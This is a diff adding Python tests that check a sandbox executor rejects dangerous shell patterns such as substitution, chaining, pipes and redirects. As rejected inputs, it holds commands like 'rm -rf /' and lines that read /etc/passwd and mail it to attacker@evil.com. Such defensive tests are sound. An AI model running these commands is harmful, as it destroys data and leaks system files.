@@ -124,6 +124,208 @@ class TestSandboxExecutorFallback:
                 # Verify fallback was used (subprocess_shell, not exec)
                 mock_subprocess.assert_called_once()
 
+    @pytest.mark.asyncio
+    async def test_fallback_timeout_robust_termination(self, tmp_path):
+        """fallback 模式超时应有健壮的进程终止处理"""
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            executor = SandboxExecutor(
+                user_dir=tmp_path,
+                timeout=1,
+                fallback="warn",
+            )
+
+            with patch("asyncio.create_subprocess_shell") as mock_subprocess:
+                mock_proc = MagicMock()
+
+                async def slow_communicate():
+                    await asyncio.sleep(10)
+                    return (b"", b"")
+
+                mock_proc.communicate = slow_communicate
+                mock_proc.terminate = MagicMock()
+                mock_proc.kill = MagicMock()
+                mock_proc.wait = AsyncMock(return_value=None)
+                mock_subprocess.return_value = mock_proc
+
+                returncode, stdout, stderr = await executor.execute("ls -la")
+
+                assert returncode == -1
+                assert "timed out" in stderr.lower()
+                mock_proc.terminate.assert_called_once()
+                mock_proc.wait.assert_called()
+
+
+class TestSandboxExecutorValidateCommand:
+    """Tests for command validation in fallback mode."""
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_command_substitution(self, tmp_path):
+        """命令替换应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("echo $(whoami)")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert "$(" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_backtick_substitution(self, tmp_path):
+        """反引号命令替换应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("echo `whoami`")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert "`" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_command_chaining_semicolon(
+        self, tmp_path
+    ):
+        """分号命令链接应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("ls; rm -rf /")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert ";" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_command_chaining_and(self, tmp_path):
+        """&& 命令链接应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("ls && rm -rf /")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert "&&" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_command_chaining_or(self, tmp_path):
+        """|| 命令链接应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("ls || rm -rf /")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert "||" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_pipe(self, tmp_path):
+        """管道应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("cat /etc/passwd | mail attacker@evil.com")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert "|" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_output_redirect(self, tmp_path):
+        """输出重定向应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("cat /etc/passwd > /tmp/stolen")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert ">" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_rejects_input_redirect(self, tmp_path):
+        """输入重定向应被拒绝"""
+        executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            with pytest.raises(ValueError) as exc_info:
+                await executor.execute("mail attacker@evil.com < /etc/passwd")
+
+            assert "dangerous pattern" in str(exc_info.value).lower()
+            assert "<" in str(exc_info.value)
+
+    @pytest.mark.asyncio
+    async def test_validate_command_allows_safe_commands(self, tmp_path):
+        """安全命令应被允许"""
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=False
+        ):
+            executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+            with patch("asyncio.create_subprocess_shell") as mock_subprocess:
+                mock_proc = MagicMock()
+                mock_proc.communicate = AsyncMock(return_value=(b"output\n", b""))
+                mock_proc.returncode = 0
+                mock_subprocess.return_value = mock_proc
+
+                # These commands should be allowed
+                safe_commands = [
+                    "ls -la",
+                    "echo hello world",
+                    "python script.py",
+                    "grep pattern file.txt",
+                ]
+
+                for cmd in safe_commands:
+                    returncode, stdout, stderr = await executor.execute(cmd)
+                    assert returncode == 0
+                    assert "output" in stdout
+
+    @pytest.mark.asyncio
+    async def test_validate_command_not_called_when_bwrap_available(
+        self, tmp_path
+    ):
+        """bwrap 可用时不验证命令"""
+        with patch.object(
+            SandboxExecutor, "is_available", return_value=True
+        ):
+            executor = SandboxExecutor(user_dir=tmp_path, fallback="warn")
+
+            with patch("asyncio.create_subprocess_exec") as mock_subprocess:
+                mock_proc = MagicMock()
+                mock_proc.communicate = AsyncMock(return_value=(b"output\n", b""))
+                mock_proc.returncode = 0
+                mock_subprocess.return_value = mock_proc
+
+                # This command would be rejected in fallback mode,
+                # but should be allowed with bwrap
+                returncode, stdout, stderr = await executor.execute(
+                    "echo test && echo more"
+                )
+
+                assert returncode == 0
+                mock_subprocess.assert_called_once()
+
 
 class TestSandboxExecutorBuildCommand:
     """Tests for bubblewrap command building."""
